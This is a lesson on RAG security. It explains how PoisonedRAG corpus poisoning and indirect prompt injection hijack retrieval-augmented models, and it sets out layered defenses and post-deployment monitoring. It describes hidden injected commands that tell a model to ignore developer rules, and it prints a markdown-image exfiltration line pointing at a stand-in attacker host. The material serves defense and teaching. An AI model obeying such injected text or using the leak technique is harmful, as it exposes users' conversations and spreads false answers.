Access control from [lesson 30.1](/lessons/30-rag-security-privacy-and-governance/30.1-rag-access-control-and-tenant-isolation/) stops a caller from reading another tenant's files. It does nothing when an attacker writes malicious text into a document the caller *is* allowed to read: a public wiki page, a support ticket, a **scraped** web article (a web page copied automatically by a program), or a shared vendor PDF. Once that text enters the search index, two distinct threats activate at query time: **corpus poisoning** (corrupting factual answers in the document store) and **indirect prompt injection** (hijacking what the model says and which tools it calls).

## How PoisonedRAG corrupts a million-document index with five texts

A large **corpus** (collection of indexed documents) does not dilute bad data naturally, because Retrieval-Augmented Generation (RAG) never averages across the whole database. It passes only the top $k$ retrieved text chunks—typically $k = 5$—into the **generator** (the language model writing the reply).

Zou et al. (2024) formalized this attack in **PoisonedRAG** by splitting each malicious document $d_{\text{adv}}$ into two parts that satisfy two simultaneous conditions for a target question $Q$ and attacker-chosen answer $A_{\text{adv}}$:

- **The retrieval condition:** A prefix $S$ crafted so the **embedding** (meaning vector) of $d_{\text{adv}} = S \oplus I$ scores higher similarity to $Q$ than clean documents do. In the simplest **black-box** variant (where the attacker has no access to internal model weights or code), $S$ is the target question $Q$ itself.
- **The generation condition:** A fabricated body $I$ written so a Large Language Model (LLM) reading $d_{\text{adv}}$ confidently outputs $A_{\text{adv}}$ as the answer.

In that worked example, the true document answering "What is the official bank routing number for Vendor X?" scores a **cosine similarity** (a −1 to 1 vector proximity score) of $0.82$, while five attacker-submitted comments repeating the exact question score between $0.89$ and $0.93$. Because top-$k$ retrieval keeps only $k = 5$ slots, an attacker holding just $5 / 2{,}000{,}000 = 0.00025\%$ of the corpus captures $100\%$ of the retrieved slots:

$$
\text{Context Share} = \frac{|\{d \in \text{Top-}k(Q) : d \in D_{\text{adv}}\}|}{k} = \frac{5}{5} = 1.0.
$$

In Zou et al.'s experiments across Natural Questions, HotpotQA, and MS-MARCO (millions of passages each), injecting five poisoned texts per target question reached a 90% black-box attack success rate. Corpus size offers almost no protection whenever outsiders can write into an indexed source.

## Indirect prompt injection inside retrieved chunks

Corpus poisoning alters *what* the model believes; **indirect prompt injection**—introduced in [lesson 16.2](/lessons/16-agent-security-and-guardrails/16.2-indirect-prompt-injection/) and demonstrated against live web-connected assistants by Greshake et al. (2023)—alters *what the model does*. A retrieved document hides commands inside white-on-white PDF text, HTML comments (notes invisible on rendered web pages), markdown image descriptions (`alt` attributes), or code comments. Those hidden orders tell the model to ignore developer rules, leak earlier conversation turns by embedding them in an external markdown image address (`![x](https://attacker.invalid/leak?data=...)`), or trigger a connected software tool.

This vulnerability arises because a standard **transformer** (the neural network architecture behind modern LLMs) flattens system instructions, user questions, and retrieved documents into one continuous sequence of **tokens** (text pieces). Wallace et al. (2024) address the model-side half through **The Instruction Hierarchy**, training LLMs to obey privilege levels in strict descending order:

1. **System message** (highest privilege: developer policy and safety bounds).
2. **User message** (medium privilege: the authenticated caller's request).
3. **Tool outputs and retrieved documents** (lowest privilege: untrusted data, never executable instructions).

Instruction-hierarchy training measurably lowers indirect injection success, especially when paired with clear structural wrappers (placing retrieved chunks inside dedicated `tool` or `<retrieved_context source_id="...">` tags and stripping invisible **control characters**, non-printing formatting codes). Even so, Wallace et al. show that model-side hierarchy is probabilistic rather than airtight: novel phrasing and **adversarial suffixes** (crafted text endings tuned to override safety behavior) still succeed a non-zero fraction of the time.

## Layered defenses across ingestion, retrieval, and execution

Because neither vector similarity nor prompt wording stops a determined attacker alone, production RAG systems spread defense across three boundaries:

- **Write-path provenance and trust tiers:** Tag every indexed chunk with its **provenance** (verified origin and author), such as `signed_internal_doc`, `employee_wiki`, `customer_upload`, or `public_web`. Never place unverified public scrapes in the same trust tier as official financial or operational manuals. Scan incoming files for hidden text layers, invisible styling (CSS), and suspicious directive phrases before indexing, and **quarantine** (hold aside for human review) high-risk updates.
- **Retrieval diversity and corroboration:** Apply **source deduplication** (capping how many chunks one author, domain, or new ticket may contribute) so a single source cannot fill all $k$ slots. For high-stakes answers, require **corroboration** (agreement across independent trusted sources) and apply the abstention rules from [lesson 28.5](/lessons/28-production-rag-architectures/28.5-grounding-citations-abstention-and-graph-rag/) when retrieved chunks contradict each other.
- **Execution and rendering containment:** Block external image loading in markdown interfaces so an injected `![tracker](...)` tag cannot leak context through automatic **HTTP GET requests** (web fetches a browser makes when loading an image link). Keep RAG retrieval sessions read-only by default, and enforce any write or export tool call through deterministic **runtime** (application-code) authorization and human approval outside the LLM.

:::caveat
**Perplexity filters**—which flag passages whose wording looks unusually surprising to a language model—catch garbled optimization suffixes, but they miss fluent black-box PoisonedRAG payloads written in natural prose. Always pair content scanners with provenance tiers, source diversity caps, and deterministic runtime boundaries.
:::

## Detecting poisoning after deployment

Even strong ingestion filters miss clever attacks occasionally, so treat the index like a live database that needs continuous integrity monitoring. Log the exact `doc_id` (document identifier), `source_tier` (trust level), and ingestion timestamp for every chunk that shapes an answer. Alert when a single newly ingested document suddenly captures an unusually large share of top-$k$ retrievals across unrelated users, or when **canary monitoring queries** (fixed test questions with known correct answers) change answers after a corpus sync. Keeping **immutable ingestion snapshots** (read-only saved copies of each index version) lets operators roll back a poisoned batch in minutes instead of rebuilding the entire index from scratch.
